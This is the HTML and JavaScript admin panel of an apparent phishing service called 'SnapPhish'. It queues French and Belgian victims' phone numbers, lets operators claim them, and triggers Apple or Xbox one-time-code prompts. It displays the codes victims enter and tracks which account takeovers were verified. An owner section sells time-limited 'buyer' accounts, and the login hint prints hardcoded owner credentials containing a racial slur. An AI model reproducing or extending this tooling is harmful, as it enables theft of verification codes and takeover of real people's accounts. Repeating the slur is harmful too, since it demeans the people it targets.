<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SnapPhish — Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body {
            min-height: 100vh;
            background: #0a0a12;
            padding: 20px;
            color: #fff;
            background-image: radial-gradient(circle at 10% 20%, rgba(255,252,0,0.03) 0%, transparent 50%);
        }
        .admin-container { max-width: 1100px; margin: 0 auto; }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 24px;
            background: rgba(26,26,40,0.8);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            border: 1px solid rgba(255,255,255,0.06);
            margin-bottom: 24px;
            flex-wrap: wrap;
            gap: 10px;
            transition: all 0.3s;
        }
        .header:hover { border-color: rgba(255,252,0,0.15); }
        .header h1 { font-size: 22px; font-weight: 600; }
        .header h1 span { color: #FFFC00; }
        .header .user-info { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
        .header .role-badge {
            background: rgba(255,252,0,0.15);
            color: #FFFC00;
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 12px;
            text-transform: uppercase;
            border: 1px solid rgba(255,252,0,0.2);
        }
        .header .role-badge.owner { background: #FFFC00; color: #000; border: none; }
        .header .logout {
            color: #ff6b6b;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            padding: 6px 16px;
            border-radius: 10px;
            border: 1px solid #ff6b6b;
            transition: all 0.3s;
        }
        .header .logout:hover { background: #ff6b6b; color: #000; }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 12px;
            margin-bottom: 24px;
        }
        .stat-card {
            background: rgba(26,26,40,0.6);
            backdrop-filter: blur(10px);
            padding: 16px;
            border-radius: 14px;
            border: 1px solid rgba(255,255,255,0.06);
            text-align: center;
            transition: all 0.3s;
        }
        .stat-card:hover { border-color: rgba(255,252,0,0.15); transform: translateY(-2px); }
        .stat-card .num { font-size: 28px; font-weight: 700; color: #FFFC00; }
        .stat-card .label { color: #888; font-size: 12px; margin-top: 4px; }

        .queue-tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
        .queue-tab {
            padding: 10px 20px;
            border-radius: 12px;
            border: 2px solid rgba(255,255,255,0.06);
            background: rgba(255,255,255,0.03);
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        .queue-tab:hover { border-color: rgba(255,252,0,0.3); }
        .queue-tab.active { border-color: #FFFC00; background: rgba(255,252,0,0.08); }
        .queue-tab .badge {
            background: #FFFC00;
            color: #000;
            padding: 1px 10px;
            border-radius: 20px;
            font-size: 12px;
            margin-left: 6px;
        }

        .numbers-list { display: flex; flex-direction: column; gap: 12px; }
        .number-card {
            background: rgba(26,26,40,0.6);
            backdrop-filter: blur(10px);
            border-radius: 14px;
            padding: 16px 20px;
            border: 1px solid rgba(255,255,255,0.06);
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            transition: all 0.3s;
            gap: 12px;
        }
        .number-card:hover { border-color: rgba(255,252,0,0.15); transform: translateY(-2px); }
        .number-card .info { flex: 1; min-width: 150px; }
        .number-card .info .num { font-size: 18px; font-weight: 600; color: #fff; }
        .number-card .info .meta { color: #888; font-size: 13px; margin-top: 2px; }
        .number-card .actions { display: flex; gap: 8px; flex-wrap: wrap; }
        .number-card .actions button {
            padding: 8px 16px;
            border-radius: 10px;
            border: none;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        .number-card .actions button:hover { transform: scale(1.03); }

        .btn-claim { background: #FFFC00; color: #000; }
        .btn-apple { background: #FFFC00; color: #000; }
        .btn-xbox { background: #00cc44; color: #000; }
        .btn-wrong { background: #ff6b6b; color: #fff; }
        .btn-verified { background: #339af0; color: #fff; }

        .otp-display {
            display: inline-block;
            background: rgba(255,252,0,0.1);
            padding: 4px 16px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 20px;
            color: #FFFC00;
            margin-right: 8px;
            border: 1px solid rgba(255,252,0,0.2);
        }

        .empty-state { text-align: center; color: #555; padding: 40px 20px; font-size: 15px; }

        .owner-section {
            background: rgba(26,26,40,0.6);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.06);
            margin-bottom: 20px;
            transition: all 0.3s;
        }
        .owner-section:hover { border-color: rgba(255,252,0,0.15); }
        .owner-section h3 { color: #FFFC00; margin-bottom: 12px; font-size: 18px; }
        .owner-section .input-group { display: flex; gap: 10px; flex-wrap: wrap; }
        .owner-section .input-group input {
            flex: 1;
            min-width: 120px;
            padding: 10px 14px;
            border-radius: 10px;
            border: 2px solid rgba(255,255,255,0.06);
            background: rgba(255,255,255,0.04);
            color: #fff;
            outline: none;
            transition: all 0.3s;
        }
        .owner-section .input-group input:focus { border-color: #FFFC00; }
        .owner-section .input-group button {
            padding: 10px 20px;
            border-radius: 10px;
            border: none;
            background: #FFFC00;
            color: #000;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .owner-section .input-group button:hover { transform: scale(1.02); }

        .buyer-list { margin-top: 12px; }
        .buyer-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            background: rgba(255,255,255,0.03);
            border-radius: 8px;
            margin-bottom: 6px;
            border: 1px solid rgba(255,255,255,0.06);
            flex-wrap: wrap;
            gap: 8px;
        }
        .buyer-item .name { color: #fff; font-weight: 500; }
        .buyer-item .date { color: #888; font-size: 12px; }
        .buyer-item .del {
            color: #ff6b6b;
            cursor: pointer;
            font-size: 12px;
            padding: 2px 10px;
            border-radius: 6px;
            border: 1px solid #ff6b6b;
        }
        .buyer-item .del:hover { background: #ff6b6b; color: #000; }

        .login-box {
            max-width: 400px;
            margin: 80px auto;
            background: rgba(26,26,40,0.8);
            backdrop-filter: blur(10px);
            padding: 32px 28px;
            border-radius: 24px;
            border: 1px solid rgba(255,255,255,0.06);
        }
        .login-box h2 { text-align: center; margin-bottom: 20px; color: #fff; }
        .login-box input {
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            border: 2px solid rgba(255,255,255,0.06);
            background: rgba(255,255,255,0.04);
            color: #fff;
            font-size: 16px;
            margin-bottom: 12px;
            outline: none;
            transition: all 0.3s;
        }
        .login-box input:focus { border-color: #FFFC00; }
        .login-box button {
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            border: none;
            background: #FFFC00;
            color: #000;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .login-box button:hover { transform: scale(1.02); }
        .login-box .hint { color: #555; text-align: center; margin-top: 12px; font-size: 13px; }

        .hidden { display: none !important; }

        @media (max-width: 600px) {
            .number-card { flex-direction: column; align-items: stretch; }
            .number-card .actions { justify-content: center; }
            .header { flex-direction: column; align-items: stretch; text-align: center; }
            .header .user-info { justify-content: center; }
        }
    </style>
</head>
<body>
    <!-- LOGIN -->
    <div id="loginPage">
        <div class="login-box">
            <h2>🔐 Admin Login</h2>
            <input type="text" id="loginUser" placeholder="Username" />
            <input type="password" id="loginPass" placeholder="Password" />
            <button onclick="login()">Login →</button>
            <p class="hint">Owner: owner / nigga</p>
        </div>
    </div>

    <!-- ADMIN PANEL -->
    <div id="adminPage" class="hidden">
        <div class="admin-container">
            <!-- HEADER -->
            <div class="header">
                <h1>💀 <span>Snap</span>Phish</h1>
                <div class="user-info">
                    <span class="role-badge" id="roleBadge">Owner</span>
                    <span id="userDisplay" style="font-size:14px;color:#888;">admin</span>
                    <span class="logout" onclick="logout()">Logout</span>
                </div>
            </div>

            <!-- STATS -->
            <div class="stats-grid" id="statsGrid">
                <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
                <div class="stat-card"><div class="num" id="statPending">0</div><div class="label">Pending</div></div>
                <div class="stat-card"><div class="num" id="statAwaitingOtp">0</div><div class="label">Awaiting OTP</div></div>
                <div class="stat-card"><div class="num" id="statOtpReceived">0</div><div class="label">OTP Received</div></div>
                <div class="stat-card"><div class="num" id="statVerified">0</div><div class="label">Verified</div></div>
                <div class="stat-card"><div class="num" id="statWrong">0</div><div class="label">Wrong</div></div>
            </div>

            <!-- OWNER SECTION -->
            <div id="ownerSection" class="hidden">
                <div class="owner-section">
                    <h3>👑 Owner Panel — Create Buyer Accounts</h3>
                    <div class="input-group">
                        <input type="text" id="newBuyerUser" placeholder="Buyer Username" />
                        <input type="text" id="newBuyerPass" placeholder="Password" />
                        <input type="number" id="newBuyerDays" placeholder="Days (30)" value="30" style="min-width:80px;" />
                        <button onclick="createBuyer()">Create Buyer</button>
                    </div>
                    <div class="buyer-list" id="buyerList"></div>
                </div>
            </div>

            <!-- QUEUE TABS -->
            <div class="queue-tabs" id="queueTabs">
                <div class="queue-tab active" onclick="switchQueue('A')">🇫🇷 France <span class="badge" id="countA">0</span></div>
                <div class="queue-tab" onclick="switchQueue('B')">🇧🇪 Belgium <span class="badge" id="countB">0</span></div>
                <div class="queue-tab" onclick="switchQueue('C')">🌍 Both <span class="badge" id="countC">0</span></div>
            </div>

            <!-- NUMBERS LIST -->
            <div id="numbersContainer">
                <div class="empty-state">Select a queue to view pending numbers.</div>
            </div>
        </div>
    </div>

    <script>
        // ============================================================
        // STATE
        // ============================================================
        let token = null;
        let currentQueue = 'A';
        let refreshInterval = null;
        let currentRole = 'owner';
        let currentUsername = '';
        let lastCount = 0;

        // ============================================================
        // NOTIFICATION SOUND
        // ============================================================
        function playNotification() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.frequency.value = 880;
                osc.type = 'sine';
                gain.gain.setValueAtTime(0.3, ctx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.12);
                osc.start(ctx.currentTime);
                osc.stop(ctx.currentTime + 0.12);
                setTimeout(() => {
                    const osc2 = ctx.createOscillator();
                    const gain2 = ctx.createGain();
                    osc2.connect(gain2);
                    gain2.connect(ctx.destination);
                    osc2.frequency.value = 1100;
                    osc2.type = 'sine';
                    gain2.gain.setValueAtTime(0.25, ctx.currentTime);
                    gain2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.1);
                    osc2.start(ctx.currentTime);
                    osc2.stop(ctx.currentTime + 0.1);
                }, 150);
            } catch(e) {
                try {
                    const audio = new Audio('data:audio/wav;base64,UklGRnoAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoAAACBhYqFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhY=');
                    audio.volume = 0.3;
                    audio.play().catch(() => {});
                } catch(e2) {}
            }
        }

        // ============================================================
        // LOGIN
        // ============================================================
        async function login() {
            const username = document.getElementById('loginUser').value.trim();
            const password = document.getElementById('loginPass').value.trim();
            if (!username || !password) { alert('Enter credentials.'); return; }
            try {
                const resp = await fetch('/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await resp.json();
                if (data.success) {
                    token = data.token;
                    currentRole = data.role;
                    currentUsername = data.username;
                    document.getElementById('loginPage').classList.add('hidden');
                    document.getElementById('adminPage').classList.remove('hidden');
                    document.getElementById('roleBadge').textContent = currentRole.toUpperCase();
                    document.getElementById('roleBadge').className = 'role-badge ' + currentRole;
                    document.getElementById('userDisplay').textContent = currentUsername;
                    if (currentRole === 'owner') {
                        document.getElementById('ownerSection').classList.remove('hidden');
                        loadBuyers();
                    } else {
                        document.getElementById('ownerSection').classList.add('hidden');
                    }
                    loadQueues();
                    refreshInterval = setInterval(loadQueues, 3000);
                } else {
                    alert('Login failed: ' + data.message);
                }
            } catch(e) { alert('Connection error.'); }
        }

        document.getElementById('loginPass').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') login();
        });
        document.getElementById('loginUser').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') document.getElementById('loginPass').focus();
        });

        function logout() {
            clearInterval(refreshInterval);
            token = null;
            document.getElementById('adminPage').classList.add('hidden');
            document.getElementById('loginPage').classList.remove('hidden');
            document.getElementById('loginPass').value = '';
            document.getElementById('loginUser').value = '';
        }

        // ============================================================
        // SWITCH QUEUE
        // ============================================================
        function switchQueue(queue) {
            currentQueue = queue;
            document.querySelectorAll('.queue-tab').forEach(el => el.classList.remove('active'));
            document.querySelector(`.queue-tab[onclick="switchQueue('${queue}')"]`).classList.add('active');
            loadQueues();
        }

        // ============================================================
        // LOAD QUEUES
        // ============================================================
        async function loadQueues() {
            try {
                const response = await fetch('/api/admin/queues');
                const data = await response.json();

                const countA = data.A?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
                const countB = data.B?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
                const countC = data.C?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;

                document.getElementById('countA').textContent = countA;
                document.getElementById('countB').textContent = countB;
                document.getElementById('countC').textContent = countC;

                const total = countA + countB + countC;
                if (total > lastCount) { playNotification(); }
                lastCount = total;

                // Stats
                const all = Object.values(data).flat();
                document.getElementById('statTotal').textContent = all.length;
                document.getElementById('statPending').textContent = all.filter(e => e.status === 'pending' || e.status === 'claimed').length;
                document.getElementById('statAwaitingOtp').textContent = all.filter(e => e.status === 'awaiting_otp').length;
                document.getElementById('statOtpReceived').textContent = all.filter(e => e.status === 'otp_received').length;
                document.getElementById('statVerified').textContent = all.filter(e => e.status === 'verified').length;
                document.getElementById('statWrong').textContent = all.filter(e => e.status === 'wrong').length;

                // Render queue
                const entries = data[currentQueue] || [];
                const pending = entries.filter(e => e.status === 'pending' || e.status === 'claimed' || e.status === 'awaiting_otp' || e.status === 'otp_received');
                const container = document.getElementById('numbersContainer');

                if (pending.length === 0) {
                    container.innerHTML = '<div class="empty-state">🎯 No pending numbers in this queue.</div>';
                    return;
                }

                container.innerHTML = pending.map(entry => `
                    <div class="number-card" id="card-${entry.id}">
                        <div class="info">
                            <div class="num">📱 ${entry.number}</div>
                            <div class="meta">${entry.country} · ${entry.network} · ${entry.timestamp.slice(0,16)}</div>
                            ${entry.otp ? `<div class="otp-display">📨 ${entry.otp}</div>` : ''}
                            ${entry.status === 'awaiting_otp' ? '<span style="color:#ffaa00;font-size:13px;">⏳ Awaiting OTP</span>' : ''}
                            ${entry.status === 'otp_received' ? '<span style="color:#FFFC00;font-size:13px;">✅ OTP Received</span>' : ''}
                            ${entry.status === 'claimed' ? '<span style="color:#ffaa00;font-size:13px;">📌 Claimed</span>' : ''}
                            ${entry.claimed_by ? `<span style="color:#888;font-size:12px;">by ${entry.claimed_by}</span>` : ''}
                        </div>
                        <div class="actions" id="actions-${entry.id}">
                            ${entry.status === 'pending' ? `
                                <button class="btn-claim" onclick="claimNumber('${entry.id}')">🎯 Claim</button>
                            ` : entry.status === 'claimed' ? `
                                <button class="btn-apple" onclick="selectPlatform('${entry.id}', 'apple')">🍎 Apple (4-Digit)</button>
                                <button class="btn-xbox" onclick="selectPlatform('${entry.id}', 'xbox')">🎮 Xbox (6-Digit)</button>
                            ` : entry.status === 'awaiting_otp' ? `
                                <span style="color:#ffaa00;">⏳ Waiting for victim to enter OTP...</span>
                            ` : entry.status === 'otp_received' ? `
                                <span style="color:#FFFC00;">OTP: ${entry.otp}</span>
                                <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
                                <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
                            ` : ''}
                        </div>
                    </div>
                `).join('');

            } catch (error) { console.error('Load error:', error); }
        }

        // ============================================================
        // ACTIONS
        // ============================================================
        function claimNumber(qid) {
            fetch('/api/admin/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ queueId: qid, action: 'claimed', username: currentUsername })
            }).then(() => loadQueues());
        }

        function selectPlatform(qid, platform) {
            const length = platform === 'apple' ? 4 : 6;
            fetch('/api/admin/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    queueId: qid,
                    action: length === 4 ? 'otp_4' : 'otp_6'
                })
            }).then(() => loadQueues());
        }

        function markVerified(qid) {
            if (!confirm('Mark this number as verified?')) return;
            fetch('/api/admin/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ queueId: qid, action: 'verified' })
            }).then(() => loadQueues());
        }

        function markWrong(qid) {
            if (!confirm('Mark this number as wrong?')) return;
            fetch('/api/admin/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ queueId: qid, action: 'wrong' })
            }).then(() => loadQueues());
        }

        // ============================================================
        // OWNER: BUYER MANAGEMENT
        // ============================================================
        async function createBuyer() {
            const username = document.getElementById('newBuyerUser').value.trim();
            const password = document.getElementById('newBuyerPass').value.trim();
            const days = parseInt(document.getElementById('newBuyerDays').value) || 30;
            if (!username || !password) { alert('Enter username/password.'); return; }
            try {
                const resp = await fetch('/api/auth/create_buyer', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token, username, password, days })
                });
                const data = await resp.json();
                if (data.success) {
                    alert(`Buyer ${username} created for ${days} days!`);
                    document.getElementById('newBuyerUser').value = '';
                    document.getElementById('newBuyerPass').value = '';
                    loadBuyers();
                } else {
                    alert('Error: ' + data.message);
                }
            } catch(e) { alert('Connection error.'); }
        }

        async function loadBuyers() {
            try {
                const resp = await fetch('/api/auth/list_buyers', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token })
                });
                const data = await resp.json();
                const list = document.getElementById('buyerList');
                if (!data.success || data.buyers.length === 0) {
                    list.innerHTML = '<p style="color:#555;font-size:14px;">No buyers created yet.</p>';
                    return;
                }
                list.innerHTML = data.buyers.map(b => `
                    <div class="buyer-item">
                        <span class="name">${b.username}</span>
                        <span class="date">Expires: ${b.expiry ? b.expiry.slice(0,10) : 'Never'}</span>
                        <span class="del" onclick="deleteBuyer('${b.username}')">Delete</span>
                    </div>
                `).join('');
            } catch(e) { console.error(e); }
        }

        async function deleteBuyer(username) {
            if (!confirm(`Delete buyer ${username}?`)) return;
            try {
                const resp = await fetch('/api/auth/delete_buyer', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token, username })
                });
                const data = await resp.json();
                if (data.success) { alert(data.message); loadBuyers(); }
                else { alert('Error: ' + data.message); }
            } catch(e) { alert('Connection error.'); }
        }

        document.getElementById('newBuyerPass').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') createBuyer();
        });

        // ============================================================
        // INIT
        // ============================================================
        document.getElementById('loginPage').classList.remove('hidden');
        document.getElementById('adminPage').classList.add('hidden');
    </script>
</body>
</html>
